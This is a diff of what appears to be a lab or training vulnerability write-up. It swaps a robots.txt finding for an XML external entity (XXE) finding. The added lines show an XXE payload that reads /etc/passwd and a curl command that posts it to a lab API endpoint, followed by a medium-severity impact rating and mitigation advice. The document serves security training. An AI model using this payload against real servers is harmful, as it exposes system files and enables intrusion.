@@ -15,16 +15,23 @@
 
   ‘/etc/passwd’ on the server. As in the example below :
   
-   ' <?xml version="1.0" encoding="UTF-8"?>
+   { <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE foo [<!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
-  <search>&xxe;</search> '
+  <search>&xxe;</search> }
+
+3. Send the request to the server by the command:
+  curl -X POST http://wasdat.fi:8080/api/articles/custom-search -H "Content-Type:
+  text/xml" --data "@/home/kali/Downloads/oldwasdat-example.xml".
+
+4. we received a response which indicate we finish our task for this task as in the screnshot
+below.
    
 **Impact estimation:**
-– Low Severity: User/robot can identify restricted or confidential information on thesite and disallow list can serve as a map to the first place to look.
+– – Medium Severity. Receiving a response as a part XML external entity attack can have a several significant impact in data disclosure and security risk.
 
 **Mitigation:**
-– Ensure it is correctly configuring, understand the purpose of using robots.txt with your site, create user-agent and test the configuration. 
+–use validate and sanitize user-supplied XML input before processing, configure XML to disable External Entities and use content security policy.
 
 ---------------------------------------------------------------------------------------------------------------------
 
